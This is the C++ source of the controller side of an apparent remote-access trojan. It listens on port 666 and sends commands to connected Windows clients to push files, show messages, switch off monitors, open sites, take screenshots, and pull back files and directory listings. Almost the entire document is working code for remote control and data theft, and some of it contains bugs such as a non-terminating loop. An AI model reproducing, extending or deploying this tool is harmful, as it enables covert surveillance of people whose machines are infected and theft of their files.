//Server
//Tastks:: Optimize
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#pragma comment(lib,"Ws2_32.lib")
#include <WinSock2.h>
#include <iostream>
#include <WS2tcpip.h>
#include <string>
#include <thread>
#define PRINTNUSERS if (ClientCount>=0) printf("%d user on-line\n", ClientCount); \
        else printf("No User on-line\n");

SOCKET Connect;
SOCKET* Connections;
SOCKET Listen;

int ClientCount = 0;

bool checkend(char *arr,int len) {
	for (int i = 0; i < len-3; i++) {
		if (arr[i] != '\0')return true;
	}
	return false;

}

void concheck(SOCKET Connect1, SOCKET Listen1, HOSTENT *hst, sockaddr_in client_addr) {
	while (1) {
		if (Connect1 = accept(Listen1, NULL, NULL)) {
			ClientCount++;
			Connections[ClientCount] = Connect1;
			printf("Client connected\n");
			printf("+%s [%s] new connect!\n",
				(hst) ? hst->h_name : "", inet_ntoa(client_addr.sin_addr));
			PRINTNUSERS
		}
	}
}

int main() {
	setlocale(LC_ALL, "russian");
	SetConsoleCP(1251);
	SetConsoleOutputCP(1251);
	WSAData data;
	WORD version = MAKEWORD(2, 2);
	int res = WSAStartup(version, &data);
	if (res != 0)
	{
		return 0;
	}

	struct addrinfo hints;
	struct addrinfo* result;

	Connections = (SOCKET*)calloc(64, sizeof(SOCKET));

	ZeroMemory(&hints, sizeof(hints));

	hints.ai_family = AF_INET;
	hints.ai_flags = AI_PASSIVE;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	getaddrinfo(NULL, "666", &hints, &result);

	Listen = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	bind(Listen, result->ai_addr, result->ai_addrlen);
	listen(Listen, SOMAXCONN);

	freeaddrinfo(result);

	printf("Starting server...");
	sockaddr_in client_addr;

	int client_addr_size = sizeof(client_addr);
	HOSTENT *hst;
	hst = gethostbyaddr((char *)&client_addr.sin_addr.s_addr, 4, AF_INET);
		char m_connect[256] = "--i";
		if (Connect = accept(Listen, NULL, NULL)) {
			ClientCount++;
			printf("Client connected\n");
			printf("+%s [%s] new connect!\n",
				(hst) ? hst->h_name : "", inet_ntoa(client_addr.sin_addr));
			PRINTNUSERS
			Connections[ClientCount] = Connect;
			send(Connections[ClientCount], m_connect, strlen(m_connect), NULL);
			std::thread t(concheck, Connect, Listen, hst, client_addr);
			t.detach();
		}
		while (true) {
			char m_connect[256] = "";
			int i = 0;
			std::cout << "Enter the command:  \n-- s send the file \n--m display the message \n--o turn off the monitor \n--e close the client \n--w open the site \n--c take a screenshot\n--d download file\n dir scan disk\n";
			char a = getchar();
			while (a != '\n') {
				m_connect[i] = a;
				i++;
				a = getchar();
			}
			for (int i = 0; i <= ClientCount; i++) {
				send(Connections[i], m_connect, strlen(m_connect), NULL);
			}
			if ((m_connect[0] == '-')&&(m_connect[1]=='-')&&((m_connect[2] == 's'))) {
				const int buflen = 1024;
				std::string file;
				std::cout << "Enter the file path\n";
				FILE *in1;
				std::cin >> file;
				fopen_s(&in1, file.c_str(), "rb");
				long int size;
				fseek(in1, 0, SEEK_END);
				size = ftell(in1);
				fclose(in1);
				char size1[256]="";
				_itoa_s(size,size1,10);
				std::cout << "Sending: " << size1 << " bytes\n";
				strcat_s(size1, "%byte%\0");
				int len = 0;
				for (int i = 0; i < sizeof(size1) / sizeof(size); i++) {
					if (size1[i] != '\0')len++;
					else {
						break;
					}
				}
				send(Connections[ClientCount], size1, len, 0);
				FILE *in;
				fopen_s(&in, file.c_str(), "rb");
				std::cout << "Transfering a file\n";
				////
				int bytesen = 0;
				///
				while (1) {
					char bufer[buflen] = "";
						int b = fread(bufer, 1, sizeof(bufer), in);
						send(Connections[ClientCount], bufer, b, 0);
						if (b < buflen)break;
				}
				fclose(in);
				std::cout << "File has been sent!"<< bytesen<<" bytes\n";
			}
			else if ((m_connect[0] == '-') && (m_connect[1] == '-') && ((m_connect[2] == 'c'))) {
				std::cout << "Trying to upload a screenshot\n";
				HANDLE hFile;
				hFile = CreateFile("screendown.png",
					GENERIC_WRITE,
					0,
					NULL,
					OPEN_ALWAYS,
					FILE_ATTRIBUTE_NORMAL,
					NULL);
				const int bufsize = 1024;
				DWORD dwBytesWritten;
				bool start = true;
				int filesize = 0;
				int bytesrec = 0;
				do {
					int unread = 0;
					bool exit = false;
					char buff[bufsize] = "";
					int nbytes = recv(Connect, buff, sizeof(buff), 0);
					if (start) {
						for (int k = 0; sizeof(buff) / sizeof(char); k++) {
							if ((buff[k] == '%') && (buff[k + 1] == 'b') && (buff[k + 2] == 'y') && (buff[k + 3] == 't') && (buff[k + 4] == 'e') && (buff[k + 5] == '%')) {
								unread += 6;
								char *temp = new char[unread - 6];
								strncpy(temp, buff, unread - 6);
								filesize = atoi(temp);
								delete[]temp;
								break;
							}
							else {
								unread++;
							}
						}
						start = false;
						bytesrec += nbytes - unread;
					}
					else {
						bytesrec += nbytes;
					}
					if (nbytes == 0) {
						break;
					}
					if (nbytes < 0)
					{
						break;
					}
					WriteFile(hFile, buff + unread, nbytes - unread, &dwBytesWritten, NULL);
					} while (bytesrec < filesize);
				CloseHandle(hFile);
			}
			else if ((m_connect[0] == '-') && (m_connect[1] == '-') && ((m_connect[2] == 'd'))) {
				std::cout << "Trying to download file\n";
				HANDLE hFile;
				hFile = CreateFile("download.exe",
					GENERIC_WRITE,
					0,
					NULL,
					OPEN_ALWAYS,
					FILE_ATTRIBUTE_NORMAL,
					NULL);
				const int bufsize = 1024;
				DWORD dwBytesWritten;
				while (1) {
					bool exit = false;
					char buff[bufsize] = "";
					int nbytes = recv(Connect, buff, sizeof(buff), 0);
					if (nbytes == 0) {
						std::cout << "File loaded\n"; break;
					}
					if (nbytes < 0)
					{
						break;
					}
					if ((buff[bufsize - 1] == '@') && (buff[bufsize - 2] == '@') && (buff[bufsize - 3] == '^')) { exit = true; }
					if (exit) {
						if (!checkend(buff, bufsize)) {
							std::cout << "File loaded\n"; break;
						}
						WriteFile(hFile, buff, nbytes - 3, &dwBytesWritten, NULL);
						std::cout << "File loaded\n"; break;
					}
					else {
						WriteFile(hFile, buff, nbytes, &dwBytesWritten, NULL);
					}
				}
				CloseHandle(hFile);
			}
			else if ((m_connect[0] == 'd') && (m_connect[1] == 'i') && ((m_connect[2] == 'r'))) {
			char answ;
			std::cout << "Press f to download in file and any button to show directories in the console\n";
			std::cin >> answ;
			if (answ == 'f') {
				std::cout << "Trying to download file\n";
				HANDLE hFile;
				hFile = CreateFile("files.txt",
					GENERIC_WRITE,
					0,
					NULL,
					OPEN_ALWAYS,
					FILE_ATTRIBUTE_NORMAL,
					NULL);
				const int bufsize = 1024;
				DWORD dwBytesWritten;
				while (1) {
					bool exit = false;
					char buff[bufsize] = "";
					int nbytes = recv(Connect, buff, sizeof(buff), 0);
					int work = 0;
					bool find = false;
					for (int i = 0; i < sizeof(buff) / sizeof(char); i++) {
						if ((buff[i] == '\0') && (!find)) { work = 1023 - i; buff[i] = '\n'; find = true; }
						if ((buff[i] == '^') && (buff[i+1] == '@') && (buff[i+2] == '@')) { exit = true; }
					}
					if (nbytes == 0) {
						std::cout << "File loaded\n"; break;
					}
					if (nbytes < 0)
					{
						break;
					}
					if (exit) {
						if (!checkend(buff, bufsize)) {
							std::cout << "File loaded\n"; break;
						}
						WriteFile(hFile, buff, nbytes - 3, &dwBytesWritten, NULL);
						std::cout << "File loaded\n"; break;
					}
					else {
						WriteFile(hFile, buff, nbytes - work, &dwBytesWritten, NULL);
					}
				}
				CloseHandle(hFile);
			}
			else {
				const int bufsize = 1024;
				bool exit = false;
				while (1) {
					char buff[bufsize] = "";
					int nbytes = recv(Connect, buff, sizeof(buff), 0);
					int work = 0;
					bool find = false;
					for (int i = 0; i < sizeof(buff) / sizeof(char); i++) {
						if ((buff[i] == '^') && (buff[i+1] == '@') && (buff[i+2] == '@')) { exit = true; }
					}
					if (nbytes == 0) {
						std::cout << "File loaded\n"; break;
					}
					if (nbytes < 0)
					{
						break;
					}
					if (exit) {
						if (!checkend(buff, bufsize)) {
							std::cout << "File loaded\n"; break;
						}
						std::cout << "\nFile loaded\n"; break;
					}
					else {
						std::cout << buff << std::endl;
					}
				}
			}
			}
		}
	return 1;
}
